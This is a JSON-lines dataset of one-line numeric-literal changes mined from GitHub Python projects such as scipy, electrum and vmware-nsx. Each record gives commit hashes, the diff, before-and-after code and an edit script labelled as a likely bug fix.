{"project": "smart-cache", "commit_sha": "bb7d8a5f6aeb511c3e25bc3161b801d9065820a0", "parent_sha": "b748470824872fded3df13675d9ab25f38f215b0", "file_path": "SmartCache/ai/models/evaluator.py", "project_url": "https://github.com/Cloud-PG/smart-cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -144,7 +144,7 @@ class Evaluator(object):\n         cache_type: str = 'simple',\n         ai_cache_type: str = 'simple',\n         cache_settings: dict = {},\n-        ai_stride: int = 1000\n+        ai_stride: int = 100\n     ):\n         self._dataset = dataset\n         self._support_table = support_table\n", "before": "ai_stride : int = 1000", "after": "ai_stride : int = 100", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1000\", 3, 26, 3, 30], \"100\"]]"}
{"project": "django-cadoshop", "commit_sha": "8ea525b74e63d251aa252f3f03076e1738f7e8b3", "parent_sha": "b3fbc7199242b6ca2a4bbb6365aa91ff3c6453ff", "file_path": "cadoshop/views.py", "project_url": "https://github.com/fsw/django-cadoshop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ def product_list(request, category_slug=''):\n                 raise\n         return redirect(request.get_full_path())\n \n-    results_per_page = 2\n+    results_per_page = 25\n     results = GroupedSearchQuerySet()\n     results = results.facet('category')\n     results = results.facet('tags')\n", "before": "results_per_page = 2", "after": "results_per_page = 25", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 24, 3, 25], \"25\"]]"}
{"project": "vmware-nsx", "commit_sha": "e3e4cbbb44106ec900d402548e6a49880903249b", "parent_sha": "f4a77a1d16eb4a91fc86910235b2e6a0f9b09cc1", "file_path": "neutron/tests/unit/services/firewall/agents/l3reference/test_firewall_l3_agent.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class TestFwaasL3AgentRpcCallback(base.BaseTestCase):\n                 mock_driver.return_value)\n \n     def test_invoke_driver_for_plugin_api(self):\n-        fake_firewall = {'id': 0, 'tenant_id': 001}\n+        fake_firewall = {'id': 0, 'tenant_id': 1}\n         self.api.plugin_rpc = mock.Mock()\n         with contextlib.nested(\n             mock.patch.object(self.api.plugin_rpc, 'get_routers'),\n", "before": "fake_firewall = { 'id' : 0 , 'tenant_id' : 001 }", "after": "fake_firewall = { 'id' : 0 , 'tenant_id' : 1 }", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:001\", 3, 48, 3, 51], \"1\"]]"}
{"project": "scipy", "commit_sha": "de44c8e4633c4b9122732fad14caaa6498dd6700", "parent_sha": "d1bebf6c45d2a7d5a6d01a20bccfaf7069129420", "file_path": "scipy/stats/_discrete_distns.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -952,7 +952,7 @@ class yulesimon_gen(rv_discrete):\n                 np.inf)\n         mu2 = np.where(alpha <= 1, np.nan, mu2)\n         g1 = np.where(alpha > 3,\n-                sqrt(alpha - 3) * (alpha + 1)**2 / (alpha * (alpha - 3)),\n+                sqrt(alpha - 2) * (alpha + 1)**2 / (alpha * (alpha - 3)),\n                 np.inf)\n         g1 = np.where(alpha <= 2, np.nan, g1)\n         g2 = np.where(alpha > 4,\n", "before": "g1 = np . where ( alpha > 3 , sqrt ( alpha - 3 ) * ( alpha + 1 ) ** 2 / ( alpha * ( alpha - 3 ) ) , np . inf )", "after": "g1 = np . where ( alpha > 3 , sqrt ( alpha - 2 ) * ( alpha + 1 ) ** 2 / ( alpha * ( alpha - 3 ) ) , np . inf )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 30, 3, 31], \"2\"]]"}
{"project": "vmware-nsx", "commit_sha": "3f56f50212a99ed503e3a9d3707d87d1df86f0f3", "parent_sha": "4bf80da40dc6f6bd082b69e8e93dd8be0e5dc876", "file_path": "neutron/tests/unit/vmware/vshield/test_edge_router.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class ServiceRouterTest(test_nsx_plugin.L3NatTest,\n \n     def setUp(self, ext_mgr=None, service_plugins=None):\n         cfg.CONF.set_override('api_extensions_path', NSXEXT_PATH)\n-        cfg.CONF.set_override('task_status_check_interval', 100, group=\"vcns\")\n+        cfg.CONF.set_override('task_status_check_interval', 200, group=\"vcns\")\n \n         # vcns does not support duplicated router name, ignore router name\n         # validation for unit-test cases\n", "before": "cfg . CONF . set_override ( 'task_status_check_interval' , 100 , group = \"vcns\" )", "after": "cfg . CONF . set_override ( 'task_status_check_interval' , 200 , group = \"vcns\" )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:100\", 3, 61, 3, 64], \"200\"]]"}
{"project": "Pokedev", "commit_sha": "51bca2b437fff29b4f5dfdf60b9017a899fe4e7b", "parent_sha": "510204a89641b530f3e4e428a3835ad274f5833e", "file_path": "pokecli.py", "project_url": "https://github.com/millejosh/Pokedev", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,8 +56,8 @@ def init_config():\n     parser.add_argument(\"-u\", \"--username\", help=\"Username\", required=required(\"username\"))\n     parser.add_argument(\"-p\", \"--password\", help=\"Password\", required=required(\"password\"))\n     parser.add_argument(\"-l\", \"--location\", help=\"Location\", required=required(\"location\"))\n-    parser.add_argument(\"-s\", \"--spinstop\", help=\"SpinPokeStop\",action='store_true')\n-    parser.add_argument(\"-w\", \"--walk\", help=\"Walk instead of teleport with given speed (meters per second, e.g. 2.5)\", type=float, default=0)\n+    parser.add_argument(\"-s\", \"--spinstop\", help=\"SpinPokeStop\", action='store_true')\n+    parser.add_argument(\"-w\", \"--walk\", help=\"Walk instead of teleport with given speed (meters per second, e.g. 2.5)\", type=float, default=2.5)\n     parser.add_argument(\"-c\", \"--cp\",help=\"Set CP less than to transfer(DEFAULT 100)\",type=int,default=100)\n     parser.add_argument(\"-k\", \"--gmapkey\",help=\"Set Google Maps API KEY\",type=str,default=None)\n     parser.add_argument(\"--steps\",help=\"Set the steps around your initial location(DEFAULT 5 mean 25 cells around your location)\",type=int,default=5)\n", "before": "parser . add_argument ( \"-w\" , \"--walk\" , help = \"Walk instead of teleport with given speed (meters per second, e.g. 2.5)\" , type = float , default = 0 )", "after": "parser . add_argument ( \"-w\" , \"--walk\" , help = \"Walk instead of teleport with given speed (meters per second, e.g. 2.5)\" , type = float , default = 2.5 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 4, 133, 4, 142], [\"float:2.5\", \"T\"], 2], [\"Delete\", [\"integer:0\", 4, 141, 4, 142]]]"}
{"project": "rfpipe", "commit_sha": "c3fae33c4fd9afffc6436ff711728d2e7eda9a3d", "parent_sha": "6a891feef59d0151eb585029bd07090b73285cb9", "file_path": "rfpipe/util.py", "project_url": "https://github.com/realfastvla/rfpipe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ def meantsub(data, mode='mean'):\n         piece = nint//5\n         dataavg = np.empty((5, nbl, nchan, npol), dtype=np.complex64)\n         _cssub0_jit(np.require(data, requirements='W'), dataavg)\n-        spline = interpolate.interp1d(np.array([piece*(i+0.5) for i in range(4)]),\n+        spline = interpolate.interp1d(np.array([piece*(i+0.5) for i in range(5)]),\n                                       dataavg, axis=0, fill_value='extrapolate',\n                                       kind='cubic')\n         dataavginterp = spline(range(len(data)))\n", "before": "spline = interpolate . interp1d ( np . array ( [ piece * ( i + 0.5 ) for i in range ( 4 ) ] ) , dataavg , axis = 0 , fill_value = 'extrapolate' , kind = 'cubic' )", "after": "spline = interpolate . interp1d ( np . array ( [ piece * ( i + 0.5 ) for i in range ( 5 ) ] ) , dataavg , axis = 0 , fill_value = 'extrapolate' , kind = 'cubic' )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:4\", 3, 78, 3, 79], \"5\"]]"}
{"project": "altEnv", "commit_sha": "58123ea15360025435ebe94bae7de59bfb0dc2d8", "parent_sha": "29cb8aa83133d603de37ce43527799c75bbb1b20", "file_path": "altEnv.py", "project_url": "https://github.com/Owlz/altEnv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ def installQEMU(_):\n         subprocess.check_output(\"../configure --python=python2 --enable-gtk --with-gtkabi=3.0 --enable-opengl --enable-linux-aio --enable-curses --enable-vnc --enable-xen --enable-system --enable-user --enable-kvm --enable-sdl --with-sdlabi=2.0 --enable-virglrenderer --extra-cflags=\\\"-I{0}\\\"\".format(os.path.join(SCRIPT_DIR,\"include\",\"include\")),shell=True,cwd=os.path.join(config['global']['base_path'],qemu_version,\"build\"))\n     except Exception as e:\n         print(e.output)\n-        exit(0)\n+        exit(1)\n     \n     # Run the make using as many cores as we can\n     subprocess.check_output(\"make -j {0}\".format(multiprocessing.cpu_count()),shell=True,cwd=os.path.join(config['global']['base_path'],qemu_version,\"build\"))\n", "before": "exit ( 0 )", "after": "exit ( 1 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 14, 3, 15], \"1\"]]"}
{"project": "beba-ctrl", "commit_sha": "1b62801f49d8b6c8529328a7518c1cc1285b4b36", "parent_sha": "29716083b95923f4a75a2b51896e993e4347b903", "file_path": "ryu/services/protocols/vrrp/event.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -120,7 +120,7 @@ class VRRPConfig(object):\n                  priority=vrrp.VRRP_PRIORITY_BACKUP_DEFAULT, ip_addresses=None,\n                  advertisement_interval=vrrp.VRRP_MAX_ADVER_INT_DEFAULT_IN_SEC,\n                  preempt_mode=True, preempt_delay=0, accept_mode=False,\n-                 statistics_interval=0, resource_id=None):\n+                 statistics_interval=30, resource_id=None):\n         # To allow version and priority default\n         assert vrid is not None\n         assert ip_addresses is not None\n", "before": "statistics_interval = 0 , resource_id", "after": "statistics_interval = 30 , resource_id", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 38, 3, 39], \"30\"]]"}
{"project": "neon-benchmarks", "commit_sha": "b49d7e6039c37431531e02f88290b96224c67c6e", "parent_sha": "26dbc4e6abfaba9e809db10cd98608610029012b", "file_path": "models/vgga.py", "project_url": "https://github.com/hughperkins/neon-benchmarks", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ def get_net():\n             layer['epsO'] = 1e-4\n             layer['epsGradW'] = 1e-4\n             layer['epsGradI'] = 1e-4\n-            if i == 0:\n+            if i == 1:\n                 layer['epsGradW'] = 1e-2\n             net.append(layer)\n             channels = op\n", "before": "if i == 0 : layer [ 'epsGradW' ] = 1e-2", "after": "if i == 1 : layer [ 'epsGradW' ] = 1e-2", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 21, 3, 22], \"1\"]]"}
{"project": "rfpipe", "commit_sha": "ace7c0126c06f53e02a30ae5eaaa8ef9d0d05b35", "parent_sha": "02f482137d6cd505fd0450a7a7f9bbec7a350c0b", "file_path": "rfpipe/candidates.py", "project_url": "https://github.com/realfastvla/rfpipe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -450,7 +450,7 @@ def cluster_candidates(cc, returnclusterer=False, label_unclustered=True):\n             min_cluster_size, min_samples = cc1.prefs.clustercands\n         elif isinstance(cc1.prefs.clustercands, bool):\n             if cc1.prefs.clustercands:\n-                min_cluster_size = 2\n+                min_cluster_size = 3\n                 min_samples = 2\n             else:\n                 logger.info(\"Not performing clustering\")\n", "before": "min_cluster_size = 2", "after": "min_cluster_size = 3", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 36, 3, 37], \"3\"]]"}
{"project": "beba-ctrl", "commit_sha": "964cc2db1d387b2b93275c300e2099448fa21618", "parent_sha": "14b075ca10486644aba8014914bf40e501b1ea28", "file_path": "ryu/ofproto/ofproto_v1_3_parser.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3323,7 +3323,7 @@ class OFPActionSetState(OFPAction):\n-    def __init__(self, state=0,state_mask=0,table_id=0,type_=None, len_=None):\n+    def __init__(self, state=0,state_mask=0xffffffff,table_id=0,type_=None, len_=None):\n         super(OFPActionSetState, self).__init__()\n         self.type = ofproto.OFPAT_SET_STATE\n         self.len = ofproto.OFP_ACTION_SET_STATE_SIZE\n", "before": "def __init__ ( self , state = 0 , state_mask = 0 , table_id = 0 , type_ = None , len_ = None ) : super ( OFPActionSetState , self ) . __init__ ( ) self . type = ofproto . OFPAT_SET_STATE self . len = ofproto . OFP_ACTION_SET_STATE_SIZE", "after": "def __init__ ( self , state = 0 , state_mask = 0xffffffff , table_id = 0 , type_ = None , len_ = None ) : super ( OFPActionSetState , self ) . __init__ ( ) self . type = ofproto . OFPAT_SET_STATE self . len = ofproto . OFP_ACTION_SET_STATE_SIZE", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 0, 43, 0, 44], \"0xffffffff\"]]"}
{"project": "beba-ctrl", "commit_sha": "5cbc0f398d006602038e768d5e5be1c3b6277997", "parent_sha": "d60e8e9d9ff316f409f7fc7c615b0a5893d43862", "file_path": "ryu/app/beba/test/experimenter_error_msg__ryu.py", "project_url": "https://github.com/beba-eu/beba-ctrl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -285,7 +285,7 @@ class BebaErrorExperimenterMsg(app_manager.RyuApp):\n         self.send_table_mod(datapath)\n         self.send_key_lookup(datapath)\n         self.send_key_update(datapath)\n-        act_type=2\n+        act_type=10\n         data=struct.pack('!I4xB',act_type,0)\n         a = ofparser.OFPActionExperimenterUnknown(experimenter=0XBEBABEBA, data=data)\n", "before": "act_type = 2", "after": "act_type = 10", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 18, 3, 19], \"10\"]]"}
{"project": "ubuntu-tweak", "commit_sha": "a50e2d7b06df6202cf26434a91e45fae4b0058b2", "parent_sha": "d23c26e239846fa84594e1f0ccfa321bf38c7ef2", "file_path": "src/common/config.py", "project_url": "https://github.com/muzena/ubuntu-tweak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -219,7 +219,7 @@ class TweakSettings:\n             height, width = int(height), int(width)\n             return (width, height)\n         else:\n-            return (740, 480)\n+            return (800, 480)\n \n     @classmethod\n     def get_icon_theme(cls):\n", "before": "else : return ( 740 , 480 )", "after": "else : return ( 800 , 480 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:740\", 3, 21, 3, 24], \"800\"]]"}
{"project": "g27", "commit_sha": "609b888430b8b3631d2c37c69b9249f919bb1f4c", "parent_sha": "785de86e66b6c57a79855e4aa9ea779f13bdf347", "file_path": "g27.py", "project_url": "https://github.com/felixhummel/g27", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class Bytewurst(object):\n \n             >>> bs = '\\x01\\x00\\x03\\x0A'\n             >>> bw = Bytewurst(bs)\n-            >>> bw.int == (1 * 1) + (0 * 256) + (3 * 512) + (10 * 16777216)\n+            >>> bw.int == (1 * 1) + (0 * 256) + (3 * 65536) + (10 * 16777216)\n             True\n", "before": "bw . int == ( 1 * 1 ) + ( 0 * 256 ) + ( 3 * 512 ) + ( 10 * 16777216 )", "after": "bw . int == ( 1 * 1 ) + ( 0 * 256 ) + ( 3 * 65536 ) + ( 10 * 16777216 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:512\", 3, 54, 3, 57], \"65536\"]]"}
{"project": "CameraNetwork", "commit_sha": "bec1b6f768bc64b75186107b7fe35433bbeaf8c0", "parent_sha": "c8e163ae4fe61e3d811862b0d1c6ddc7c68f15b8", "file_path": "src/picam/scripts/picam_server.py", "project_url": "https://github.com/lvsn/CameraNetwork", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class picam_server:\n         self.flash_led(nflash=3)\n         self.picam.close()\n \n-    def flash_led(self,nflash=1,delay=0.25):\n+    def flash_led(self,nflash=1,delay=0.1):\n         #nflash is the number of blink the led will make\n         for n in range(nflash):\n             gpio.digitalWrite(self.led,True)\n", "before": "def flash_led ( self , nflash = 1 , delay = 0.25 ) : for n in range ( nflash ) : gpio . digitalWrite ( self . led , True )", "after": "def flash_led ( self , nflash = 1 , delay = 0.1 ) : for n in range ( nflash ) : gpio . digitalWrite ( self . led , True )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:0.25\", 3, 39, 3, 43], \"0.1\"]]"}
{"project": "electrum", "commit_sha": "7977fa9ff2bef9f8bd0f79bfeedbef484fcb2f47", "parent_sha": "75ab58396292c7f77bb742e78a4ca6b634b586b0", "file_path": "gui/qt/main_window.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1998,7 +1998,7 @@ class ElectrumWindow(QMainWindow):\n         fee_e.setText(self.format_amount(self.wallet.fee).strip())\n         grid.addWidget(fee_e, 2, 1)\n         msg = _('Fee per kilobyte of transaction.') + ' ' \\\n-            + _('Recommended value') + ': ' + self.format_amount(50000)\n+            + _('Recommended value') + ': ' + self.format_amount(20000)\n         grid.addWidget(HelpButton(msg), 2, 2)\n         if not self.config.is_modifiable('fee_per_kb'):\n             for w in [fee_e, fee_label]: w.setEnabled(False)\n", "before": "msg = _ ( 'Fee per kilobyte of transaction.' ) + ' ' + _ ( 'Recommended value' ) + ': ' + self . format_amount ( 50000 )", "after": "msg = _ ( 'Fee per kilobyte of transaction.' ) + ' ' + _ ( 'Recommended value' ) + ': ' + self . format_amount ( 20000 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:50000\", 3, 66, 3, 71], \"20000\"]]"}
{"project": "electrum", "commit_sha": "b79da90d02c110c5caf55dd5435456ba12088c8f", "parent_sha": "e9e117712af55fdd071d571ce0f30655ba977b91", "file_path": "lib/gui_lite.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -320,7 +320,7 @@ class MiniWindow(QDialog):\n         self.history_list.hide()\n         self.history_list.setAlternatingRowColors(True)\n \n-        main_layout.addWidget(self.history_list, 3, 0, 1, 2)\n+        main_layout.addWidget(self.history_list, 3, 0, 1, 3)\n         \n \n         self.receiving = receiving_widget.ReceivingWidget(self)\n", "before": "main_layout . addWidget ( self . history_list , 3 , 0 , 1 , 2 )", "after": "main_layout . addWidget ( self . history_list , 3 , 0 , 1 , 3 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 59, 3, 60], \"3\"]]"}
{"project": "electrum", "commit_sha": "68c7d2e349e98320a1cc23ccc20a90559814ca8c", "parent_sha": "29cf811858a491056f8f05b0ab22b94033f894cf", "file_path": "gui/qt/main_window.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1392,7 +1392,7 @@ class ElectrumWindow(QMainWindow):\n             item.setToolTip(4, pr_tooltips.get(status,''))\n             item.setData(0, 32, key)\n             item.setFont(1, QFont(MONOSPACE_FONT))\n-            item.setFont(2, QFont(MONOSPACE_FONT))\n+            item.setFont(3, QFont(MONOSPACE_FONT))\n             l.addTopLevelItem(item)\n         l.setCurrentItem(l.topLevelItem(0))\n \n", "before": "item . setFont ( 2 , QFont ( MONOSPACE_FONT ) )", "after": "item . setFont ( 3 , QFont ( MONOSPACE_FONT ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 26, 3, 27], \"3\"]]"}
{"project": "electrum", "commit_sha": "00ded10810be0e2c9119e3b54596f5d64d6e082c", "parent_sha": "6cb5ba43145a84beb1f4e52198482c8fd4a48f4a", "file_path": "lib/commands.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ register_command('deseed',             0, 1, 0, [], [], 'Remove seed from wallet\n register_command('decoderawtx',        0, 0, 0, [('tx', 'Serialized transaction')], [], 'Decode raw transaction.', '')\n register_command('getprivatekeys',     0, 1, 1, [('address', 'Bitcoin address')], [], 'Get the private keys of a wallet address.', '')\n register_command('dumpprivkeys',       0, 1, 1, [], [], 'Dump private keys from your wallet', '')\n-register_command('freeze',             0, 1, 1, [('address', 'Bitcoin address')], [], 'Freeze address.', 'Freeze the funds at one of your wallet\\'s addresses')\n+register_command('freeze',             0, 1, 0, [('address', 'Bitcoin address')], [], 'Freeze address.', 'Freeze the funds at one of your wallet\\'s addresses')\n register_command('getbalance',         1, 1, 0, [], [], 'Return the balance of your wallet', '')\n register_command('getservers',         1, 0, 0, [], [], 'Return the list of available servers', '')\n", "before": "register_command ( 'freeze' , 0 , 1 , 1 , [ ( 'address' , 'Bitcoin address' ) ] , [ ] , 'Freeze address.' , 'Freeze the funds at one of your wallet\\'s addresses' )", "after": "register_command ( 'freeze' , 0 , 1 , 0 , [ ( 'address' , 'Bitcoin address' ) ] , [ ] , 'Freeze address.' , 'Freeze the funds at one of your wallet\\'s addresses' )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 46, 3, 47], \"0\"]]"}
{"project": "electrum", "commit_sha": "5a015bc29022070b9612fc55050b79d29f013014", "parent_sha": "e2b75d9fbc9934e8b534241c25b281ab52c312d9", "file_path": "lib/wallet.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class Wallet:\n         self.seed_version          = config.get('seed_version', SEED_VERSION)\n         self.gap_limit             = config.get('gap_limit', 5)\n         self.use_change            = config.get('use_change',True)\n-        self.fee                   = int(config.get('fee_per_kb',20000))\n+        self.fee                   = int(config.get('fee_per_kb',50000))\n         self.num_zeros             = int(config.get('num_zeros',0))\n         self.use_encryption        = config.get('use_encryption', False)\n         self.seed                  = config.get('seed', '')               # encrypted\n", "before": "self . fee = int ( config . get ( 'fee_per_kb' , 20000 ) )", "after": "self . fee = int ( config . get ( 'fee_per_kb' , 50000 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:20000\", 3, 66, 3, 71], \"50000\"]]"}
{"project": "electrum", "commit_sha": "c59f4c2fb2123fabbfe5c5e6fcb223b2a16ff7f5", "parent_sha": "437c79eab50e115045289c0f235cff95e9f8aec6", "file_path": "gui/gui_classic.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1915,7 +1915,7 @@ class ElectrumWindow(QMainWindow):\n         fee_e.setText(self.format_amount(self.wallet.fee).strip())\n         grid_wallet.addWidget(fee_e, 0, 2)\n         msg = _('Fee per kilobyte of transaction.') + ' ' \\\n-            + _('Recommended value') + ': ' + self.format_amount(20000)\n+            + _('Recommended value') + ': ' + self.format_amount(50000)\n         grid_wallet.addWidget(HelpButton(msg), 0, 3)\n         if not self.config.is_modifiable('fee_per_kb'):\n             for w in [fee_e, fee_label]: w.setEnabled(False)\n", "before": "msg = _ ( 'Fee per kilobyte of transaction.' ) + ' ' + _ ( 'Recommended value' ) + ': ' + self . format_amount ( 20000 )", "after": "msg = _ ( 'Fee per kilobyte of transaction.' ) + ' ' + _ ( 'Recommended value' ) + ': ' + self . format_amount ( 50000 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:20000\", 3, 66, 3, 71], \"50000\"]]"}
{"project": "electrum", "commit_sha": "69957c4fbbc09298fcea055521021c4af1d94744", "parent_sha": "9c763f6a4ecad043f0301208336caa654ed3b04d", "file_path": "lib/util.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -304,7 +304,7 @@ def ub_default_diffculty(is_pos):\n     if is_pos == 0:\r\n         return 0x00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffff\r\n     else:\r\n-        return 0x0fffff0000000000000000000000000000000000000000000000000000000000\r\n+        return 0x000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffff\r\n \r\n \r\n def android_ext_dir():\r\n", "before": "return 0x0fffff0000000000000000000000000000000000000000000000000000000000", "after": "return 0x000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffff", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0x0fffff0000000000000000000000000000000000000000000000000000000000\", 3, 16, 3, 82], \"0x000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffff\"]]"}
{"project": "electrum", "commit_sha": "ab2d0f389c939adf0d89b8ec39b22132c0aeff3e", "parent_sha": "348ef7d72c85cec3897b2b306f6a2264cc089f9f", "file_path": "lib/transaction.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ def parse_scriptSig(d, _bytes):\n         item = decoded[0][1]\n         if item[0] == 0:\n             d['address'] = bitcoin.hash160_to_p2sh(bitcoin.hash_160(item))\n-            d['type'] = 'p2wpkh-p2sh' if len(item) == 21 else 'p2wsh-p2sh'\n+            d['type'] = 'p2wpkh-p2sh' if len(item) == 22 else 'p2wsh-p2sh'\n         else:\n             # payto_pubkey\n             d['type'] = 'p2pk'\n", "before": "d [ 'type' ] = 'p2wpkh-p2sh' if len ( item ) == 21 else 'p2wsh-p2sh'", "after": "d [ 'type' ] = 'p2wpkh-p2sh' if len ( item ) == 22 else 'p2wsh-p2sh'", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:21\", 3, 55, 3, 57], \"22\"]]"}
{"project": "electrum", "commit_sha": "f381aee83549a456a47f2d2a001f7215023a3117", "parent_sha": "b69cb213335481aeb3d7d9363d4871159d427d51", "file_path": "gui/qt/main_window.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -712,7 +712,7 @@ class ElectrumWindow(QMainWindow, MessageBoxMixin, PrintError):\n \n         self.expires_combo = QComboBox()\n         self.expires_combo.addItems(map(lambda x:x[0], expiration_values))\n-        self.expires_combo.setCurrentIndex(1)\n+        self.expires_combo.setCurrentIndex(3)\n         self.expires_combo.setFixedWidth(self.receive_amount_e.width())\n         msg = ' '.join([\n             _('Expiration date of your request.'),\n", "before": "self . expires_combo . setCurrentIndex ( 1 )", "after": "self . expires_combo . setCurrentIndex ( 3 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 44, 3, 45], \"3\"]]"}
{"project": "sunpy", "commit_sha": "f0132de2c5a4be8074ee225a7e914c2dec81270b", "parent_sha": "a5fc16a47e449532474618ac177fdd53e23b420a", "file_path": "sunpy/map/map.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -685,7 +685,7 @@ Dimension:\\t [%d, %d]\n             if range_a[0] is None:\n                 range_a[0] = 0\n             if range_a[1] is None:\n-                range_a[1] = self.shape[0]\n+                range_a[1] = self.shape[1]\n             if range_b[0] is None:\n                 range_b[0] = 0\n             if range_b[1] is None:\n", "before": "range_a [ 1 ] = self . shape [ 0 ]", "after": "range_a [ 1 ] = self . shape [ 1 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 41, 3, 42], \"1\"]]"}
{"project": "CCnet_Tensorflow", "commit_sha": "777df2fc627fee24687dfcd582795f0948d85fa8", "parent_sha": "560f2f06d8eaecee5270533efeb447906c361acf", "file_path": "lib-4cas/layer_utils/proposal_top_layer.py", "project_url": "https://github.com/chriszhenghaochen/CCnet_Tensorflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ def proposal_top_layer(rpn_cls_prob, rpn_bbox_pred, im_info, _feat_stride, ancho\n \n         pre_scores = pre_scores.ravel()\n         rejinds = np.where(pre_scores >= reject_factor)\n-        scores[rejinds] = -2\n+        scores[rejinds] = -1\n   #-------------------------------done---------------------------------#\n \n \n", "before": "scores [ rejinds ] = - 2", "after": "scores [ rejinds ] = - 1", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 28, 3, 29], \"1\"]]"}
